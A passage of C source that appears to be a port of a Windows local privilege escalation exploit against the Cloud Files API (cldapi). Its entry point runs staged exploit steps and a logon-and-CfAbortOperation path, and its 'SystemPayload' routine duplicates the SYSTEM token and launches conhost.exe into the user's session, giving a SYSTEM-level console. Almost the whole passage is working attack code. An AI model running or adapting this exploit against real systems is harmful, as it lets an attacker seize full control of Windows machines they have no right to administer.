    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                          TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                          &tok))
        return;
    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &dupTok))
    {
        CloseHandle(tok);
        return;
    }
    CloseHandle(tok);
    SetTokenInformation(dupTok, TokenSessionId, &sessionId, sizeof(sessionId));

    STARTUPINFOW si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
    wchar_t cmd[] = L"";
    CreateProcessAsUserW(dupTok, L"C:\\Windows\\System32\\conhost.exe",
                         cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    CloseHandle(dupTok);
}

// ---------------------------------------------------------------------------
// CLI parse (no CRT) — replicate the C# entrypoint behaviour.
// ---------------------------------------------------------------------------

static void ParseCmdLine(int* argc_out, wchar_t*** argv_out)
{
    LPWSTR* a = CommandLineToArgvW(GetCommandLineW(), argc_out);
    *argv_out = a;
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

void mainCRTStartup(void)
{
    g_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
    g_heap   = GetProcessHeap();

    if (!ResolveApi())
    {
        OutLine(L"[!] Failed to resolve required APIs (ntdll/cldapi).");
        ExitProcess(1);
    }

    if (IsLocalSystem())
    {
        SystemPayload();
        ExitProcess(0);
    }

    // Sanity: CfGetPlatformInfo must succeed (Cloud Files platform present).
    CF_PLATFORM_INFO pi; ZeroMemory(&pi, sizeof(pi));
    HRESULT hr = pCfGetPlatformInfo(&pi);
    if (FAILED(hr))
    {
        Printf(L"[!] CfGetPlatformInfo: 0x%08X\r\n", hr);
        ExitProcess(1);
    }
    Printf(L"[i] Cloud Files: build %u rev %u int %u\r\n",
           pi.BuildNumber, pi.RevisionNumber, pi.IntegrationNumber);

    int argc = 0;
    wchar_t** argv = NULL;
    ParseCmdLine(&argc, &argv);

    // argv[0] is exe path, mimic C#'s args[] where args[0] = first user arg.
    int userArgc = argc - 1;
    wchar_t** userArgv = argv + 1;

    if (userArgc <= 1)
    {
        int stage = (userArgc >= 1) ? ParseIntW(userArgv[0]) : 0;
        switch (stage)
        {
            case 0: Stage0(); break;
            case 1: Stage1(TRUE); break;
            case 2: Stage2(); break;
            case 3: Stage3(); break;
            default: OutLine(L"[!] unknown stage"); break;
        }
    }
    else
    {
        // <user> <password> — logon + CfAbortOperation under that identity.
        HANDLE tok = NULL;
        if (!LogonUserW(userArgv[0], L"", userArgv[1],
                        LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &tok))
        {
            Printf(L"[!] LogonUser failed: %u\r\n", GetLastError());
        }
        else
        {
            if (!ImpersonateLoggedOnUser(tok)) { Printf(L"[!] Impersonate: %u\r\n", GetLastError()); }
            else
            {
                pCfAbortOperation(GetCurrentProcessId(), NULL, CF_ABORT_FLAG_BLOCK);
                RevertToSelf();
            }
            CloseHandle(tok);
        }
    }

    LocalFree(argv);
    ExitProcess(0);
}
